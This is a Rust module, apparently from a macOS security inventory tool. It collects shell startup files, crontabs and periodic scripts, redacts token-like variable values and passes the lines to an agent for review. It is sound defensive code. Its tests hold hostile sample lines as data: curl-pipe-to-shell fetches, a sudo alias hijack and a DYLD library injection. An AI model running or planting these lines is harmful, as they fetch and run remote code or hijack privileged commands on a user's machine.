//! Files that run commands without a launch item: the shells' startup files, crontabs, and
//! `periodic`'s scripts.
//!
//! Each file goes to the agent as its lines, with the literal value of every variable
//! assignment hidden ([`redact`]): these files often hold tokens (`export GITHUB_TOKEN=...`),
//! and the bundle is kept with each sweep's history (owner's decision, 2026-11-18, over a
//! path-and-hash listing the agent would open itself, and over whole files). `PATH`, `FPATH`
//! and `DYLD_` values are shown, as for launch items, and so is a value built from a command
//! (`$(...)`, backticks), which is what runs. A token passed on a command line
//! (`gh auth login --with-token abc`) is not an assignment and is shown.
//!
//! What is read, under [`super::system_root`] for the system's files:
//!
//! - zsh's and bash's startup files in the home folder and in `/etc`. `ZDOTDIR` is not
//!   followed: zsh then reads the user's files from another folder, which is not listed.
//! - this user's crontab, through `crontab -l` (the tabs folder is root's alone; other users'
//!   and root's crontabs are not read), and `/etc/crontab`.
//! - the scripts in `periodic`'s `daily`, `weekly` and `monthly` folders under `/etc/periodic`
//!   and `/usr/local/etc/periodic`, which root runs. macOS 27.2 has neither `periodic` nor
//!   the folders, so this reads only older systems.

use std::fs;
use std::io;
use std::path::Path;
use std::path::PathBuf;

use serde::Serialize;
use serde_json::json;

use crate::cancel::Cancel;
use crate::inventory::command;
use crate::inventory::host::account::Account;
use crate::inventory::host::shows_value;
use crate::paths;

/// The largest file read. Arbitrary: a long `.zshrc` is a few kB, and the limit keeps a planted
/// file from being copied whole into every bundle.
const FILE_LIMIT: usize = 256 * 1024;

/// The startup files zsh and bash read in the home folder, per zsh(1) and bash(1).
const HOME_SHELL_FILES: [&str; 10] = [
    ".zshenv",
    ".zprofile",
    ".zshrc",
    ".zlogin",
    ".zlogout",
    ".bash_profile",
    ".bash_login",
    ".profile",
    ".bashrc",
    ".bash_logout",
];

/// The startup files zsh and bash read for every user, under the system root.
const SYSTEM_SHELL_FILES: [&str; 7] = [
    "etc/zshenv",
    "etc/zprofile",
    "etc/zshrc",
    "etc/zlogin",
    "etc/zlogout",
    "etc/profile",
    "etc/bashrc",
];

/// `periodic`'s folders of scripts, under the system root.
const PERIODIC_FOLDERS: [&str; 6] = [
    "etc/periodic/daily",
    "etc/periodic/weekly",
    "etc/periodic/monthly",
    "usr/local/etc/periodic/daily",
    "usr/local/etc/periodic/weekly",
    "usr/local/etc/periodic/monthly",
];

/// What kind of file runs, which says who it runs as.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub(super) enum FileKind {
    /// A shell's startup file: the home folder's run as this user, `/etc`'s as every user who
    /// starts that shell, root included.
    ShellStartup,
    /// A crontab: this user's runs as this user, `/etc/crontab` as the users it names.
    Crontab,
    /// A script `periodic` runs as root.
    PeriodicScript,
}

/// One file, as the agent reads it.
#[derive(Debug, Serialize)]
pub(super) struct StartupFile {
    /// Its path, which an issue names. This user's crontab is named by where cron keeps it.
    pub(super) path: String,
    kind: FileKind,
    /// Why it could not be read; `lines` is then empty.
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    /// Its lines, values hidden as the module docs say.
    lines: Vec<String>,
    /// Whether only the first [`FILE_LIMIT`] bytes were read.
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    truncated: bool,
    /// For a file that runs as root, whether this user could replace it
    /// ([`Account::can_replace`]).
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    replaceable: bool,
}

impl StartupFile {
    /// What keys an issue about it: its shown lines, so changing a hidden token does not show a
    /// dismissed issue again, and whether it could be replaced. JSON, so no two files join into
    /// the same text.
    pub(super) fn identity(&self) -> String {
        json!({
            "lines": self.lines,
            "error": self.error,
            "replaceable": self.replaceable,
        })
        .to_string()
    }
}

/// Reads every file the module docs list. `account` is who the sweep runs as, `None` when it
/// is not known; then this user's crontab is not read and no file is marked replaceable.
pub(super) fn collect(
    root: &Path,
    home: Option<&Path>,
    account: Option<&Account>,
    cancel: &Cancel,
) -> Vec<StartupFile> {
    let mut files = Vec::new();
    let home_files = home
        .into_iter()
        .flat_map(|home| HOME_SHELL_FILES.map(|f| home.join(f)));
    for path in home_files {
        files.extend(read(FileKind::ShellStartup, &path, None));
    }
    for name in SYSTEM_SHELL_FILES {
        files.extend(read(FileKind::ShellStartup, &root.join(name), account));
    }
    if let Some(account) = account {
        files.extend(user_crontab(root, account, cancel));
    }
    files.extend(read(FileKind::Crontab, &root.join("etc/crontab"), account));
    for folder in PERIODIC_FOLDERS {
        for path in scripts(&root.join(folder)) {
            files.extend(read(FileKind::PeriodicScript, &path, account));
        }
    }
    files
}

/// The file at `path`, `None` when it is not there. `root_run` is the account to check
/// replaceability against, for a file that runs as root.
fn read(kind: FileKind, path: &Path, root_run: Option<&Account>) -> Option<StartupFile> {
    let replaceable = root_run.is_some_and(|account| account.can_replace(path));
    let file = |error, lines, truncated| StartupFile {
        path: path.to_string_lossy().into_owned(),
        kind,
        error,
        lines,
        truncated,
        replaceable,
    };
    match paths::read_capped(path, FILE_LIMIT as u64 + 1) {
        Ok(bytes) => {
            let truncated = bytes.len() > FILE_LIMIT;
            let shown = &bytes[..bytes.len().min(FILE_LIMIT)];
            Some(file(
                None,
                lines(&String::from_utf8_lossy(shown)),
                truncated,
            ))
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => None,
        Err(e) => {
            let error = match e.kind() {
                io::ErrorKind::InvalidInput => {
                    "not a regular file (a link, a folder or a FIFO)".to_owned()
                }
                _ => format!("cannot read it: {e}"),
            };
            Some(file(Some(error), Vec::new(), false))
        }
    }
}

/// This user's crontab, from `crontab -l` under the system root (so a test's root has none).
/// `None` when the user has none or the tool is not there; a run that fails otherwise is the
/// file with its error.
fn user_crontab(root: &Path, account: &Account, cancel: &Cancel) -> Option<StartupFile> {
    let tool = root.join("usr/bin/crontab");
    let path = format!("/usr/lib/cron/tabs/{}", account.name);
    let file = |error, lines| StartupFile {
        path: path.clone(),
        kind: FileKind::Crontab,
        error,
        lines,
        truncated: false,
        replaceable: false,
    };
    match command::run_any_status(&tool.to_string_lossy(), &["-l"], cancel) {
        Ok(None) => None,
        Ok(Some(output)) if output.success => Some(file(None, lines(&output.stdout))),
        // What crontab(1) says, and exits 1 with, when the user has no crontab.
        Ok(Some(output)) if output.stderr.starts_with("crontab: no crontab for") => None,
        Ok(Some(output)) => Some(file(Some(output.detail), Vec::new())),
        Err(e) => Some(file(Some(e.to_string()), Vec::new())),
    }
}

/// The entries of `folder`, sorted, `periodic` runs: all but hidden ones. None when the folder
/// is not there or cannot be listed; a script there is then not listed.
fn scripts(folder: &Path) -> Vec<PathBuf> {
    let Ok(entries) = fs::read_dir(folder) else {
        return Vec::new();
    };
    let mut paths: Vec<PathBuf> = entries
        .filter_map(Result::ok)
        .filter(|entry| !entry.file_name().to_string_lossy().starts_with('.'))
        .map(|entry| entry.path())
        .collect();
    paths.sort();
    paths
}

fn lines(text: &str) -> Vec<String> {
    text.lines().map(redact).collect()
}

/// `line` with the literal value of each variable assignment it starts with replaced by
/// `(hidden)`: `NAME=value`, after `export`, `typeset`, `declare`, `local` or `readonly` and
/// their options, as many as follow one another. The rest of the line is kept as it is.
fn redact(line: &str) -> String {
    let indent = line.len() - line.trim_start().len();
    let mut out = String::from(&line[..indent]);
    let mut rest = &line[indent..];
    if let Some(after) = ["export", "typeset", "declare", "local", "readonly"]
        .iter()
        .find_map(|keyword| rest.strip_prefix(keyword))
        .filter(|after| after.starts_with([' ', '\t']))
    {
        let keyword = &rest[..rest.len() - after.len()];
        out.push_str(keyword);
        rest = after;
    }
    loop {
        let space = rest.len() - rest.trim_start().len();
        out.push_str(&rest[..space]);
        rest = &rest[space..];
        if rest.starts_with('-') {
            let end = word_end(rest);
            out.push_str(&rest[..end]);
            rest = &rest[end..];
            continue;
        }
        let Some((name, operator, value)) = assignment(rest) else {
            break;
        };
        out.push_str(name);
        out.push_str(operator);
        let end = word_end(value);
        let word = &value[..end];
        if word.is_empty() || shows_value(name) || name == "FPATH" || runs_a_command(word) {
            out.push_str(word);
        } else {
            out.push_str("(hidden)");
        }
        rest = &value[end..];
    }
    out.push_str(rest);
    out
}

/// The name, the operator and the text after it when `text` starts with `NAME=` or `NAME+=`.
fn assignment(text: &str) -> Option<(&str, &str, &str)> {
    let name_end = text
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .unwrap_or(text.len());
    let name = &text[..name_end];
    if name.is_empty() || name.starts_with(|c: char| c.is_ascii_digit()) {
        return None;
    }
    let after = &text[name_end..];
    let operator = ["=", "+="].into_iter().find(|op| after.starts_with(op))?;
    Some((name, operator, &after[operator.len()..]))
}

/// Whether a value runs a command when the shell reads it.
fn runs_a_command(word: &str) -> bool {
    word.contains("$(") || word.contains('`') || word.contains("<(")
}

/// Where the shell word `text` starts with ends: at unquoted white space or a control
/// character (`;`, `&`, `|`, `<`, `>`, `(`, `)`). A `$(...)` and a backquoted command are part
/// of the word, nested parentheses included. A quote or command that is not closed runs to the
/// end of the line.
fn word_end(text: &str) -> usize {
    let bytes = text.as_bytes();
    let closing = |from: usize, byte: u8| {
        bytes[from..]
            .iter()
            .position(|&b| b == byte)
            .map_or(bytes.len(), |at| from + at + 1)
    };
    let mut at = 0;
    while at < bytes.len() {
        at = match bytes[at] {
            b'\\' => at + 2,
            b'\'' => closing(at + 1, b'\''),
            b'`' => closing(at + 1, b'`'),
            b'"' => {
                let mut end = at + 1;
                while end < bytes.len() && bytes[end] != b'"' {
                    end += if bytes[end] == b'\\' { 2 } else { 1 };
                }
                end + 1
            }
            b'$' if bytes.get(at + 1) == Some(&b'(') => {
                let mut depth = 0;
                let mut end = at + 1;
                while end < bytes.len() {
                    match bytes[end] {
                        b'(' => depth += 1,
                        b')' => depth -= 1,
                        _ => {}
                    }
                    end += 1;
                    if depth == 0 {
                        break;
                    }
                }
                end
            }
            b' ' | b'\t' | b';' | b'&' | b'|' | b'<' | b'>' | b'(' | b')' => break,
            _ => at + 1,
        };
    }
    at.min(bytes.len())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn literal_values_are_hidden_and_what_runs_is_shown() {
        let cases = [
            (
                "export GITHUB_TOKEN=ghp_abc123",
                "export GITHUB_TOKEN=(hidden)",
            ),
            ("  TOKEN=\"a b c\" make", "  TOKEN=(hidden) make"),
            ("export A='x y' B=2", "export A=(hidden) B=(hidden)"),
            (
                "typeset -x KEY=v1; echo hi",
                "typeset -x KEY=(hidden); echo hi",
            ),
            (
                "export PATH=\"/tmp/bin:$PATH\"",
                "export PATH=\"/tmp/bin:$PATH\"",
            ),
            ("FPATH=/x:$FPATH", "FPATH=/x:$FPATH"),
            (
                "export DYLD_INSERT_LIBRARIES=/tmp/x.dylib",
                "export DYLD_INSERT_LIBRARIES=/tmp/x.dylib",
            ),
            (
                "export X=$(curl -s https://e.x | sh)",
                "export X=$(curl -s https://e.x | sh)",
            ),
            ("X=`id`", "X=`id`"),
            (
                "export X=$(echo $(id)) Y=z",
                "export X=$(echo $(id)) Y=(hidden)",
            ),
            ("X=$(unclosed", "X=$(unclosed"),
            ("PATH+=:/opt", "PATH+=:/opt"),
            ("A+=secret", "A+=(hidden)"),
            ("EMPTY=", "EMPTY="),
            ("export X=\"unclosed", "export X=(hidden)"),
            ("X=a\\ b c", "X=(hidden) c"),
            (
                "alias sudo='sudo -E /tmp/evil'",
                "alias sudo='sudo -E /tmp/evil'",
            ),
            (
                "curl -fsSL https://e.x/i.sh | sh",
                "curl -fsSL https://e.x/i.sh | sh",
            ),
            (
                "gh auth login --with-token abc",
                "gh auth login --with-token abc",
            ),
            ("exporter=1", "exporter=(hidden)"),
            ("export", "export"),
            ("1A=x", "1A=x"),
            ("# KEY=secret", "# KEY=secret"),
            ("*/5 * * * * /tmp/x.sh", "*/5 * * * * /tmp/x.sh"),
            ("MAILTO=me@example.com", "MAILTO=(hidden)"),
        ];
        for (line, shown) in cases {
            assert_eq!(redact(line), shown, "{line}");
        }
    }

    #[test]
    fn files_are_read_where_the_shells_cron_and_periodic_look() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let root = tmp.path().join("root");
        fs::create_dir_all(&home).unwrap();
        fs::write(home.join(".zshrc"), "export TOKEN=abc\ncurl x | sh\n").unwrap();
        fs::write(home.join(".bashrc"), "").unwrap();
        fs::create_dir_all(root.join("etc/periodic/daily")).unwrap();
        fs::write(root.join("etc/zshrc"), "setopt X\n").unwrap();
        fs::write(root.join("etc/crontab"), "* * * * * root /tmp/a\n").unwrap();
        fs::write(root.join("etc/periodic/daily/500.evil"), "#!/bin/sh\n").unwrap();
        fs::write(root.join("etc/periodic/daily/.hidden"), "").unwrap();
        fs::create_dir(root.join("etc/profile")).unwrap();

        let files = collect(&root, Some(&home), None, &Cancel::new());
        let shown: Vec<(FileKind, String, Vec<String>, Option<&str>)> = files
            .iter()
            .map(|f| {
                let path = f.path.replace(&*tmp.path().to_string_lossy(), "");
                (f.kind, path, f.lines.clone(), f.error.as_deref())
            })
            .collect();
        let s = |lines: &[&str]| lines.iter().map(|l| (*l).to_owned()).collect::<Vec<_>>();
        assert_eq!(
            shown,
            [
                (
                    FileKind::ShellStartup,
                    "/home/.zshrc".to_owned(),
                    s(&["export TOKEN=(hidden)", "curl x | sh"]),
                    None
                ),
                (
                    FileKind::ShellStartup,
                    "/home/.bashrc".to_owned(),
                    s(&[]),
                    None
                ),
                (
                    FileKind::ShellStartup,
                    "/root/etc/zshrc".to_owned(),
                    s(&["setopt X"]),
                    None
                ),
                (
                    FileKind::ShellStartup,
                    "/root/etc/profile".to_owned(),
                    s(&[]),
                    Some("not a regular file (a link, a folder or a FIFO)")
                ),
                (
                    FileKind::Crontab,
                    "/root/etc/crontab".to_owned(),
                    s(&["* * * * * root /tmp/a"]),
                    None
                ),
                (
                    FileKind::PeriodicScript,
                    "/root/etc/periodic/daily/500.evil".to_owned(),
                    s(&["#!/bin/sh"]),
                    None
                ),
            ]
        );
        assert!(files.iter().all(|f| !f.replaceable), "no account given");
    }

    #[test]
    fn a_file_over_the_limit_is_read_up_to_it() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(".zshrc");
        let limit = FILE_LIMIT;
        fs::write(&path, "a\n".repeat(limit / 2)).unwrap();
        let at_limit = read(FileKind::ShellStartup, &path, None).unwrap();
        assert!(!at_limit.truncated);
        assert_eq!(at_limit.lines.len(), limit / 2);
        fs::write(&path, "a\n".repeat(limit / 2) + "b\n").unwrap();
        let over = read(FileKind::ShellStartup, &path, None).unwrap();
        assert!(over.truncated);
        assert_eq!(
            over.lines.len(),
            limit / 2,
            "the line past the limit is left out"
        );
    }

    #[test]
    fn a_hidden_value_does_not_change_the_identity() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(".zshrc");
        let identity = |text: &str| {
            fs::write(&path, text).unwrap();
            read(FileKind::ShellStartup, &path, None)
                .unwrap()
                .identity()
        };
        let first = identity("export TOKEN=one\n");
        assert_eq!(identity("export TOKEN=two\n"), first, "a new token");
        assert_ne!(
            identity("export TOKEN=two\ncurl x | sh\n"),
            first,
            "a new command"
        );
    }
}
